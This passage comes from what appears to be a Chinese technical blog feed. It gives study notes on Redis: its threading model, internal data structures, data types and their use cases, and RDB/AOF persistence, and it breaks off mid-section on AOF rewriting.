<p>多服务实例下消息重复消费：Redis 的 pub/sub 模式目前只有广播模式，这意味着当生产者向特定频道发布一条消息时，所有订阅相关频道的消费者都能够收到该消息。</p>
</li>
</ol>
<h2 id="4-2-Redisson延迟队列">4.2 Redisson延迟队列</h2>
<p>Redisson 的延迟队列 RDelayedQueue 是基于 Redis 的 SortedSet 来实现的。SortedSet 是一个有序集合，其中的每个元素都可以设置一个分数，代表该元素的权重。Redisson 利用这一特性，将需要延迟执行的任务插入到 SortedSet 中，并给它们设置相应的过期时间作为分数。</p>
<p>Redisson 使用 <code>zrangebyscore</code> 命令扫描 SortedSet 中过期的元素，然后将这些过期元素从 SortedSet 中移除，并将它们加入到就绪消息列表中。就绪消息列表是一个阻塞队列，有消息进入就会被监听到。这样做可以避免对整个 SortedSet 进行轮询，提高了执行效率。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>减少了丢消息的可能性</p>
</li>
<li class="lvl-2">
<p>消息不存在重复消费问题</p>
</li>
</ul>
<h1>5 频繁点赞操作</h1>
<p>采用redis的集合（set），通过用户ID判断点赞唯一性，利用Redis作为缓存更新，异步写入数据库；异步通知点赞人，就将点击当成事件放到一个队列中 统一处理即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">setnx mylock uuid</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis(1)：数据结构、持久化、缓存</title>
    <url>/2024/03/17/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis(1)%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%81%E6%8C%81%E4%B9%85%E5%8C%96%E3%80%81%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h1>1 Redis</h1>
<blockquote>
<p>Redis（<strong>RE</strong>mote <strong>DI</strong>ctionary <strong>S</strong>erver）是一个基于 C 语言开发的开源 NoSQL 数据库（BSD 许可）。与传统数据库不同的是，Redis 是一种基于内存的数据库(内存数据库，支持持久化)，对数据的读写操作都是在内存中完成，因此<strong>读写速度非常快</strong>，常用于<strong>缓存，消息队列、分布式锁等场景</strong>。Redis 存储的是 KV 键值对数据。</p>
<p>Redis 还支持<strong>事务 、持久化、Lua 脚本、多种集群方案（主从复制模式、哨兵模式、切片集群模式）、发布/订阅模式，内存淘汰机制、过期删除机制</strong>等等。</p>
</blockquote>
<blockquote></blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403222141612.png" alt="image.png"></p>
<div class="tips">
<p><em>redis为什么快</em></p>
</div>
<ol>
<li class="lvl-3">
<p>内存存储：Redis将数据存储在内存中，相比于传统的磁盘存储，内存的读写速度更快，可以达到微秒级的响应时间。（<strong>高性能</strong>）</p>
</li>
<li class="lvl-3">
<p>单线程模型：Redis采用单线程模型，避免了多线程之间的竞争和锁的开销，避免了频繁的上下文切换</p>
</li>
<li class="lvl-3">
<p>非阻塞IO：Redis使用了异步的非阻塞IO模型，通过IO多路复用技术（如epoll、kqueue等）实现高效的网络通信，提高了并发处理能力。基于 Reactor 模式设计开发了一套高效的事件处理模型，主要是单线程事件循环和 IO 多路复用。(<strong>高并发</strong>)</p>
</li>
<li class="lvl-3">
<p>简单的数据结构：Redis支持多种简单的数据结构，如字符串、哈希表、列表、集合和有序集合等，这些数据结构的实现都经过了优化，使得Redis在处理这些数据结构时更加高效。</p>
</li>
</ol>
<h1>2 Redis单线程/多线程</h1>
<h2 id="2-1-Redis线程模型">2.1 Redis线程模型</h2>
<p><strong>Redis 基于 Reactor 模式设计开发了一套高效的事件处理模型</strong>，这套事件处理模型对应的是 Redis 中的文件事件处理器（file event handler）。由于文件事件处理器（file event handler）是单线程方式运行的，所以我们一般都说 Redis 是单线程模型。</p>
<p>Redis针对大键值对异步删除。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>文件事件处理器使用 I/O 多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。</p>
</li>
<li class="lvl-2">
<p>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</p>
</li>
</ul>
<blockquote>
<p>[!note] 事件</p>
<ul class="lvl-1">
<li class="lvl-2">文件事件(file event) : Redis 服务器通过套接字与客户端（或者其他Redis服务器）进行连接，而文件事件就是服务器对套接字操作的抽象</li>
<li class="lvl-2">时间事件(time event ) : Redis 服务器中的一些操作（比如serverCron 函数）需要在给定的时间点执行，而时间事件就是服务器对这类定时操作的抽象。</li>
</ul>
</blockquote>
<p>Redis基于Reactor模式开发了文件事件处理器，文件事件处理器以单线程方式运行，使用I/O多路复用(multiplexing)程序监听多个套接字。<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403212018322.png" alt="image.png|425"><br>
多个 socket 可能会并发产生不同的操作，每个操作对应不同的文件事件，但是 IO 多路复用程序会监听多个 socket，会将 socket 产生的事件放入队列中排队，事件分派器每次从队列中取出一个事件，把该事件交给对应的事件处理器进行处理。</p>
<h2 id="2-2-Redis6-0引入多线程">2.2 Redis6.0引入多线程</h2>
<p>Redis 的主要工作（网络 I/O 和执行命令）一直是单线程模型，但是在 Redis 6.0 版本之后，也采用了多个 I/O 线程来处理网络请求。</p>
<p><strong>Redis 单线程指的是「接收客户端请求-&gt;解析请求 -&gt;进行数据读写等操作-&gt;发送数据给客户端」这个过程是由一个线程（主线程）来完成的</strong></p>
<p>这是因为随着网络硬件的性能提升，<mark>Redis 的性能瓶颈有时会出现在网络 I/O 的处理上</mark>。 所以为了提高网络 I/O 的并行度，Redis 6.0 对于网络 I/O 采用多线程来处理。但是对于命令的执行，Redis 仍然使用单线程来处理。</p>
<h2 id="2-3-IO多路复用select-poll-epoll">2.3 IO多路复用select/poll/epoll</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>select</strong>： select允许程序同时监控多个文件描述符的读写状态，但受限于位图大小，且每次调用都需从用户空间向内核空间复制位图，性能开销大。</p>
</li>
<li class="lvl-2">
<p><strong>poll</strong>： poll改进了select，使用数组存储文件描述符，无位图大小限制，可处理更多文件描述符。但同样存在每次调用时的用户空间到内核空间的复制开销。</p>
</li>
<li class="lvl-2">
<p><strong>epoll</strong>： epoll是Linux特有的高效IO多路复用机制，基于事件驱动，无需轮询，通过<strong>注册感兴趣的事件并在事件发生时通知应用程序</strong>，适合处理大量并发连接，性能优越且资源消耗低。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405102128483.png" alt="image.png"></p>
<h1>3 数据结构</h1>
<h2 id="3-1-SDS">3.1 SDS</h2>
<blockquote>
<p>简单动态字符串（simple dynamic string， SDS）</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>O(1)时间获取字符串长度</p>
</li>
<li class="lvl-2">
<p>C字符串不记录自身长度可能导致<mark>缓冲区溢出</mark></p>
</li>
<li class="lvl-2">
<p><mark>减少修改字符串带来的内存重分配次数</mark>，每次增长或者缩短一个C字符串，程序都要对保存这个C字符串的数组进行一次内存重分配操作。<mark>空间预分配、惰性空间释放（未使用空间）</mark></p>
</li>
<li class="lvl-2">
<p><mark>二进制安全</mark>，C字符串除了末尾之外，字符串里面不能有空字符，否则被认为字符串末尾。这些限制使得C 字符串只能保存文本数据，而不能保存像图片、音频、视频、压缩文件这样的二进制数据</p>
</li>
</ul>
<h2 id="3-2-链表">3.2 链表</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>链表被广泛用于实现Redis的各种功能，比如列表建、发布与订阅、慢查询、监视器等。</p>
</li>
<li class="lvl-2">
<p>每个链表节点由一个listNode结构来表示，每个节点都有一个指向前置节点和后置节点的指针，所以Redis的链表实现是双端链表。</p>
</li>
<li class="lvl-2">
<p>每个链表使用一个list结构表示，这个结构带有表头节点指针、表尾节点指针，以及链表长度等信息。</p>
</li>
<li class="lvl-2">
<p>因为链表表头的前置节点和表尾节点的后置节点都指向NULL，所以Redis的链表实现是无环链表。</p>
</li>
<li class="lvl-2">
<p>通过为链表设置不同的类型特定函数，Redis的链表可以用于保存各种不同类型的值。</p>
</li>
</ul>
<h2 id="3-3-dict-字典">3.3 dict(字典)</h2>
<ol>
<li class="lvl-3">
<p>字典被广泛用于实现Redis的各种功能，其中包括数据库和哈希键。</p>
</li>
<li class="lvl-3">
<p>Redis中的字典使用哈希表作为底层结构实现，每个字典带有两个哈希表，一个平时使用，另一个仅在进行rehash时使用。</p>
</li>
<li class="lvl-3">
<p>Redis使用MurmurHash2算法来计算键的哈希值。</p>
</li>
<li class="lvl-3">
<p>哈希表使用链地址法来解决键冲突。</p>
</li>
</ol>
<p>使用两个哈希表：<mark>渐进性rehash</mark><br>
 为了避免 rehash 对服务器性能造成影响， 服务器不是一次性将 ht[0]里面的所有键值对全部 rehash 到 ht[1]， 而是分多次、渐进式地将 ht[0]里面的键值对慢慢地 rehash 到 ht[1]。</p>
<h2 id="3-4-skiplist-跳跃表">3.4 skiplist(跳跃表)</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403192037048.png" alt="image.png"><br>
跳跃表(skiplist) 是一种有序数据结构，它通过在每个节点中维持多个指向其他节点的指针， 从而达到快速访问节点的目的。跳表在原始链表基础上，建立多级索引，通过多级索引检索定位将增删改查的时间复杂度变为O(log n)。</p>
<h2 id="3-5-intset-整数集合">3.5 intset(整数集合)</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403182013767.png" alt="image.png"></p>
<h2 id="3-6-ziplist-压缩列表">3.6 ziplist(压缩列表)</h2>
<blockquote>
<p>每个压缩列表节点可以保存一个字节数组或者一个整数值</p>
</blockquote>
<p>压缩列表(ziplist)是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么就是小整数值，要么就是长度比较短的字符串，那么Redis就会使用压缩列表来做列表键的底层实现。</p>
<h1>4 数据类型应用场景</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>String 类型的应用场景：缓存对象、常规计数、分布式锁、共享 session 信息等。</p>
</li>
<li class="lvl-2">
<p>List 类型的应用场景：消息队列（但是有两个问题：1. 生产者需要自行实现全局唯一 ID；2. 不能以消费组形式消费数据）等。微博的关注列表，粉丝列表， 消息列表等功能都可以用Redis的 list 结构来实现。基于 list 实现分页查询，实现高性能分页。</p>
</li>
<li class="lvl-2">
<p>Hash 类型：缓存对象、购物车等。</p>
</li>
<li class="lvl-2">
<p>Set 类型：聚合计算（并集、交集、差集）场景，比如点赞、共同关注、抽奖活动等。</p>
</li>
<li class="lvl-2">
<p>Zset 类型：排序场景，比如排行榜、电话和姓名排序等。</p>
</li>
<li class="lvl-2">
<p>BitMap（2.2 版新增）：二值状态统计的场景，比如签到、判断用户登陆状态、<strong>连续签到用户总数</strong>等；</p>
</li>
<li class="lvl-2">
<p>HyperLogLog（2.8 版新增）：海量数据基数统计的场景，比如百万级网页 UV 计数等；</p>
</li>
<li class="lvl-2">
<p>GEO（3.2 版新增）：存储地理位置信息的场景，比如滴滴叫车；</p>
</li>
<li class="lvl-2">
<p>Stream（5.0 版新增）：消息队列，相比于基于 List 类型实现的消息队列，有这两个特有的特性：自动生成全局唯一消息ID，支持以消费组形式消费数据。</p>
</li>
</ul>
<h1>5 数据类型</h1>
<blockquote>
<p>字符串对象、列表对象、哈希对象、集合对象、有序集合</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403182035300.png" alt="image.png|475"></p>
<blockquote>
<p>Redis使用对象来表示数据库中的键和值， 每次当我们在Redis的数据库中新创建一个键值对时，我们至少会创建两个对象，一个对象用作键值对的键（键对象），另一个对象用作键值对的值（ 值对象）。</p>
<p>对于Redis 数据库保存的键值对来说，键总是个字符串对象，而值则可以是字符串对象、列表对象、哈希对象、集合对象或者有序集合对象的其中一种。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405102119021.png" alt="image.png"></p>
<h2 id="5-1-String-字符串">5.1 String(字符串)</h2>
<blockquote>
<p>字符串对象的编码可以是int、raw 或者embstr 。<br>
String 是最基本的 key-value 结构，key 是唯一标识，value 是具体的值，value其实不仅是字符串， 也可以是数字（整数或浮点数），value 最多可以容纳的数据长度是 <code>512M</code>。<br>
String 是一种二进制安全的数据类型，可以用来存储任何类型的数据比如字符串、整数、浮点数、图片（图片的 base64 编码或者解码或者图片的路径）、序列化后的对象。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403181914384.png" alt="image.png|450"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403181915498.png" alt="image.png|600"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403181915442.png" alt="image.png|600"></p>
<h3 id="5-1-1-应用场景">5.1.1 应用场景</h3>
<p><strong>需要存储常规数据的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：缓存 Session、Token、图片地址、<mark>序列化后的对象</mark>(相比较于Hash存储更节省内存)、缓存对象JSON数据</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SET</code>、<code>GET</code>。</p>
</li>
</ul>
<p><strong>需要计数的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：用户单位时间的请求数（简单限流可以用到）、页面单位时间的访问数。计算访问次数、点赞、转发、库存数量等等。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SET</code>、<code>GET</code>、 <code>INCR</code>、<code>DECR</code> 。</p>
</li>
</ul>
<p><strong>分布式锁</strong><br>
利用 <code>SETNX key value</code> 命令可以实现一个最简易的分布式锁。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果 key 不存在，则显示插入成功，可以用来表示加锁成功；</p>
</li>
<li class="lvl-2">
<p>如果 key 存在，则会显示插入失败，可以用来表示加锁失败。</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SETNX key value</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>key：锁</p>
</li>
<li class="lvl-2">
<p>value：客户端生成的唯一标识</p>
</li>
</ul>
<p><strong>共享session</strong><br>
通常我们在开发后台管理系统时，会使用 Session 来保存用户的会话(登录)状态，这些 Session 信息会被保存在服务器端，但这只适用于单系统应用，如果是分布式系统此模式将不再适用。</p>
<p>例如用户一的 Session 信息被存储在服务器一，但第二次访问时用户一被分配到服务器二，这个时候服务器并没有用户一的 Session 信息，就会出现需要重复登录的问题，问题在于分布式系统每次会把请求随机分配到不同的服务器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405111745810.png" alt="image.png|450"></p>
<h3 id="5-1-2-String-还是-Hash-存储对象数据更好呢？">5.1.2 String 还是 Hash 存储对象数据更好呢？</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>String 存储的是序列化后的对象数据，存放的是整个对象。Hash 是对对象的每个字段单独存储，可以获取部分字段的信息，也可以修改或者添加部分字段，节省网络流量。如果对象中某些字段需要经常变动或者经常需要单独查询对象中的个别字段信息，Hash 就非常适合。</p>
</li>
<li class="lvl-2">
<p>String 存储相对来说更加节省内存，缓存相同数量的对象数据，String 消耗的内存约是 Hash 的一半。并且，存储具有多层嵌套的对象时也方便很多。如果系统对性能和资源消耗非常敏感的话，String 就非常适合。</p>
</li>
</ul>
<h2 id="5-2-List-列表对象">5.2 List(列表对象)</h2>
<blockquote>
<p>列表对象的编码可以是ziplist或者linkedlist</p>
</blockquote>
<h3 id="5-2-1-应用场景">5.2.1 应用场景</h3>
<p><strong>信息流展示</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：最新文章、最新动态。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>LPUSH</code>、<code>LRANGE</code>。</p>
</li>
</ul>
<p><strong>消息队列</strong><br>
<code>List</code> 可以用来做消息队列，只是功能过于简单且存在很多缺陷，不建议这样做。</p>
<h2 id="5-3-hash-哈希对象">5.3 hash(哈希对象)</h2>
<blockquote>
<p>哈希对象的编码可以是ziplist或者hashtable 。</p>
</blockquote>
<h3 id="5-3-1-应用场景">5.3.1 应用场景</h3>
<p><strong>对象数据存储场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：用户信息、商品信息、文章信息、购物车信息。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>HSET</code> （设置单个字段的值）、<code>HMSET</code>（设置多个字段的值）、<code>HGET</code>（获取单个字段的值）、<code>HMGET</code>（获取多个字段的值）。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403231516738.png" alt="image.png"></p>
</li>
</ul>
<h2 id="5-4-Set-集合对象">5.4 Set(集合对象)</h2>
<blockquote>
<p>集合对象的编码可以是intset或者hashtable 。</p>
</blockquote>
<h3 id="5-4-1-应用场景">5.4.1 应用场景</h3>
<p><strong>需要存放的数据不能重复的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：网站 UV独立访客 统计（数据量巨大的场景还是 <code>HyperLogLog</code>更适合一些）、文章点赞、动态点赞等场景。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SCARD</code>（获取集合数量） 。<br>
<strong>需要获取多个数据源交集、并集和差集的场景</strong></p>
</li>
<li class="lvl-2">
<p>举例：共同好友(交集)、共同粉丝(交集)、共同关注(交集)、好友推荐（差集）、音乐推荐（差集）、订阅号推荐（差集+交集） 等场景。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SINTER</code>（交集）、<code>SINTERSTORE</code> （交集）、<code>SUNION</code> （并集）、<code>SUNIONSTORE</code>（并集）、<code>SDIFF</code>（差集）、<code>SDIFFSTORE</code> （差集）。<br>
<strong>需要随机获取数据源中的元素的场景</strong></p>
</li>
<li class="lvl-2">
<p>举例：抽奖系统、随机点名等场景。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SPOP</code>（随机获取集合中的元素并移除，适合不允许重复中奖的场景）、<code>SRANDMEMBER</code>（随机获取集合中的元素，适合允许重复中奖的场景）。</p>
</li>
</ul>
<p><strong>动态点赞</strong><br>
Set 类型可以保证一个用户只能点一个赞，key 是文章id，value 是用户id。</p>
<h2 id="5-5-Zset-Sorted-Set，有序集合对象">5.5 Zset(Sorted Set，有序集合对象)</h2>
<blockquote>
<p>有序集合的编码可以是ziplist或者skiplist。和 Set 相比，Sorted Set 增加了一个权重参数 <code>score</code>，使得集合中的元素能够按 <code>score</code> 进行有序排列，还可以通过 <code>score</code> 的范围来获取元素的列表，获取指定有序集合中指定元素的 score 值。有点像是 Java 中 <code>HashMap</code> 和 <code>TreeSet</code> 的结合体。</p>
</blockquote>
<h3 id="5-5-1-应用场景">5.5.1 应用场景</h3>
<p><strong>需要随机获取数据源中的元素根据某个权重进行排序的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：各种排行榜比如直播间送礼物的排行榜、朋友圈的微信步数排行榜、王者荣耀中的段位排行榜、话题热度排行榜等等。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>ZRANGE</code> (从小到大排序)、 <code>ZREVRANGE</code> （从大到小排序）、<code>ZREVRANK</code> (指定元素排名)。</p>
</li>
</ul>
<p><strong>需要存储的数据有优先级或者重要程度的场景</strong> 比如优先级任务队列。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：优先级任务队列。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>ZRANGE</code> (从小到大排序)、 <code>ZREVRANGE</code> （从大到小排序）、<code>ZREVRANK</code> (指定元素排名)。</p>
</li>
</ul>
<h3 id="5-5-2-有序集合为什么不用平衡树、红黑树、B-树实现">5.5.2 有序集合为什么不用平衡树、红黑树、B+树实现</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>平衡树：平衡树的插入、删除和查询的时间复杂度和跳表一样都是 <strong>O(log n)</strong>。对于范围查询来说，平衡树也可以通过中序遍历的方式达到和跳表一样的效果。但平衡树需要保证整棵树左右节点的绝对平衡，旋转操作比较费时</p>
</li>
<li class="lvl-2">
<p>红黑树：跳表的实现更简单，红黑树是弱平衡树，需要通过旋转和染色来保证黑平衡。<strong>红黑树区间查找效率不高</strong>。</p>
</li>
<li class="lvl-2">
<p>B+树：B+树是数据库和文件系统的索引结构，目的是减少IO次数定位到更多的数据。Redis是内存数据库，在进行插入时只需通过索引将数据插入到链表中合适的位置再随机维护一定高度的索引即可，节约内存。 B+树那样插入时发现失衡时还需要对节点分裂与合并。</p>
</li>
</ul>
<p>B+树</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>多叉树结构</strong>：它是一棵多叉树，每个节点可以包含多个子节点，减小了树的高度，查询效率高。</p>
</li>
<li class="lvl-2">
<p><strong>存储效率高</strong>:其中非叶子节点存储多个 key，叶子节点存储 value，使得每个节点更够存储更多的键，根据索引进行范围查询时查询效率更高。</p>
</li>
<li class="lvl-2">
<p><strong>平衡性</strong>：它是绝对的平衡，即树的各个分支高度相差不大，确保查询和插入时间复杂度为<strong>O(log n)</strong>。</p>
</li>
<li class="lvl-2">
<p><strong>顺序访问</strong>：叶子节点间通过链表指针相连，范围查询表现出色。</p>
</li>
<li class="lvl-2">
<p><strong>数据均匀分布</strong>：B+树插入时可能会导致数据重新分布，使得数据在整棵树分布更加均匀，保证范围查询和删除效率。</p>
</li>
</ul>
<h2 id="5-6-Bitmap（位图）">5.6 Bitmap（位图）</h2>
<blockquote>
<p>通过一个bit位来表示某个元素对应的值或者状态</p>
</blockquote>
<p>Bitmap，即位图，是一串连续的二进制数组（0和1），可以通过偏移量（offset）定位元素。BitMap通过最小的单位bit来进行<code>0|1</code>的设置，表示某个元素的值或者状态，时间复杂度为O(1)。</p>
<p>由于 bit 是计算机中最小的单位，使用它进行储存将非常节省空间，特别适合一些数据量大且使用<strong>二值统计的场景</strong>。</p>
<h3 id="5-6-1-应用场景">5.6.1 应用场景</h3>
<p><strong>需要保存状态信息（0/1 即可表示）的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：用户签到情况、活跃用户情况、用户行为统计（比如是否点赞过某个视频）。</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>SETBIT</code>、<code>GETBIT</code>、<code>BITCOUNT</code>、<code>BITOP</code>。</p>
</li>
</ul>
<p><strong>签到统计</strong></p>
<p><strong>判断用户登录状态</strong></p>
<h2 id="5-7-HyperLogLog（基数统计）">5.7 HyperLogLog（基数统计）</h2>
<p>HyperLogLog是一种用于「统计基数」的数据集合类型，基数统计就是指<code>统计一个集合中不重复的元素个数</code>，基数计数概率算法。但要注意，HyperLogLog 是统计规则是基于概率完成的，不是非常准确，标准误算率是 0.81%。</p>
<p>所以，简单来说 HyperLogLog <strong>提供不精确的去重计数</strong>。</p>
<h3 id="5-7-1-应用场景">5.7.1 应用场景</h3>
<p><strong>数量量巨大（百万、千万级别以上）的计数场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：热门网站每日/每周/每月访问 ip 数统计、热门帖子 uv 统计、</p>
</li>
<li class="lvl-2">
<p>相关命令：<code>PFADD</code>、<code>PFCOUNT</code>。</p>
</li>
</ul>
<p>uv的全称是Unique Visitor，译为独立访问用户数，访问网站的一台电脑客户端为一个访客。<br>
pv的全称是Page View，译为页面浏览量或点击量，通常是衡量一个网站甚至一条网络新闻的指标。</p>
<p><strong>百万级网页UV计数</strong></p>
<h2 id="5-8-Geospatial-地理位置">5.8 Geospatial (地理位置)</h2>
<p>Redis GEO 是 Redis 3.2 版本新增的数据类型，主要用于存储地理位置信息，并对存储的信息进行操作。</p>
<p><strong>需要管理使用地理空间数据的场景</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>举例：附近的人。</p>
</li>
<li class="lvl-2">
<p>相关命令: <code>GEOADD</code>、<code>GEORADIUS</code>、<code>GEORADIUSBYMEMBER</code> 。</p>
</li>
</ul>
<h2 id="5-9-Stream">5.9 Stream</h2>
<p><strong>消息队列</strong></p>
<p><a href="https://xiaolincoding.com/redis/data_struct/command.html#string">Redis 常见数据类型和应用场景 | 小林coding (xiaolincoding.com)</a></p>
<h1>6 持久化</h1>
<h2 id="6-1-快照（snapshotting，RDB）">6.1 快照（snapshotting，RDB）</h2>
<blockquote>
<p>RDB 文件用于保存和还原Redis 服务器所有数据库中的所有键值对数据。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403202231741.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>save</code> : 同步保存操作，会阻塞 Redis 主线程；</p>
</li>
<li class="lvl-2">
<p><code>bgsave</code> : fork 出一个子进程，子进程执行，不会阻塞 Redis 主线程，默认选项。</p>
</li>
</ul>
<h2 id="6-2-只追加文件（append-only-file-AOF）">6.2 只追加文件（append-only file, AOF）</h2>
<p>实时性能更好</p>
<blockquote>
<p>与RDB 持久化通过保存数据库中的键值对来记录数据库状态不同， AOF 持久化是通过保存Redis服务器所执行的写命令来记录数据库状态的，</p>
</blockquote>
<p>Redis 在执行完一条写操作命令后，就会把该命令以追加的方式写入到一个文件里，然后 Redis 重启时，会读取该文件记录的命令，然后逐一执行命令的方式来进行数据恢复。</p>
<h3 id="6-2-1-写回策略">6.2.1 写回策略</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>命令追加</p>
</li>
<li class="lvl-2">
<p>AOF文件的写入和同步（写入指写入缓冲区，同步将缓冲区的内容写回硬盘）：命令会先写入AOF缓冲区，再定期写入和同步到AOF文件<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405112126562.png" alt="image.png|400"></p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p>Redis执行完写操作命令后，会将命令追加到 <code>server.aof_buf</code> <mark>AOF缓冲区</mark>；</p>
</li>
<li class="lvl-3">
<p>然后通过 write() 系统调用，将 aof_buf 缓冲区的数据写入到 AOF 文件，此时数据并没有写入到硬盘，而是拷贝到了<mark>内核缓冲区</mark> page cache，等待内核将数据写入硬盘；</p>
</li>
<li class="lvl-3">
<p>根据持久化方式（ <code>fsync</code>策略）的配置来决定何时将系统内核缓存区的数据同步到硬盘中的。</p>
</li>
</ol>
<h3 id="6-2-2-AOF持久化方式">6.2.2 AOF持久化方式</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>appendfsync always</strong> 每次有数据修改发生时都会调用fsync函数同步AOF文件,fsync完成后线程返回,这样会严重降低Redis的速度</p>
</li>
<li class="lvl-2">
<p><strong>appendfsync everysec</strong> 每秒钟调用fsync函数同步一次AOF文件</p>
</li>
<li class="lvl-2">
<p><strong>appendfsync no</strong> 让操作系统决定何时进行同步，一般为30秒一次</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405112127278.png" alt="image.png"></p>
<h3 id="6-2-3-为什么先执行命令，再把数据写入日志呢？">6.2.3 为什么先执行命令，再把数据写入日志呢？</h3>
<p>Reids 是先执行写操作命令后，才将该命令记录到 AOF 日志里的，这么做其实有两个好处。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>避免额外的检查开销</strong>：因为如果先将写操作命令记录到 AOF 日志里，再执行该命令的话，如果当前的命令语法有问题，那么如果不进行命令语法检查，该错误的命令记录到 AOF 日志里后，Redis 在使用日志恢复数据时，就可能会出错。</p>
</li>
<li class="lvl-2">
<p><strong>不会阻塞当前写操作命令的执行</strong>：因为当写操作命令执行成功后，才会将命令记录到 AOF 日志。</p>
</li>
</ul>
<p>当然，这样做也会带来风险：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>数据可能会丢失：</strong> 执行写操作命令和记录日志是两个过程，那当 Redis 在还没来得及将命令写入到硬盘时，服务器发生宕机了，这个数据就会有丢失的风险。</p>
</li>
<li class="lvl-2">
<p><strong>可能阻塞其他操作：</strong> 由于写操作命令执行成功后才记录到 AOF 日志，所以不会阻塞当前命令的执行，但因为 AOF 日志也是在主线程中执行，所以当 Redis 把日志文件写入磁盘的时候，还是会阻塞后续的操作无法执行。</p>
</li>
</ul>
<h3 id="6-2-4-AOF重写">6.2.4 AOF重写</h3>
<p>通过读取数据库中的键值对来实现的，程序无须对现有 AOF 文件进行任何读入、分析或者写入操作。重写后的AOF文件只包含还原当前数据库状态所需要的命令，新的AFO文件更节省空间。</p>
<p>AOF 重写机制是在重写时，读取当前数据库中的所有键值对，然后将每一个键值对用一条命令记录到「新的 AOF 文件」，等到全部记录完后，就将新的 AOF 文件替换掉现有的 AOF 文件。</p>
<p>比如：多次向列表中添加删除元素，可以优化为向列表中添加剩下的元素</p>
<p>在AOF重写通过<mark>子进程</mark>进行，在重写过程中，服务器接收客户端请求可能改变服务器状态：<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403212002120.png" alt="image.png"><br>
服务器进程：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>执行客户端发来的命令</p>
</li>
<li class="lvl-2">
<p>将执行后的写命令追加到AOF缓冲区</p>
</li>
<li class="lvl-2">
<p>将执行后的写命令追加到AOF重写缓冲区。</p>
</li>
</ul>
<p>Redis 的<strong>重写 AOF 过程是由后台子进程 <em>bgrewriteaof</em> 来完成的</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>子进程进行 AOF 重写期间，主进程可以继续处理命令请求，从而避免阻塞主进程；</p>
</li>
<li class="lvl-2">
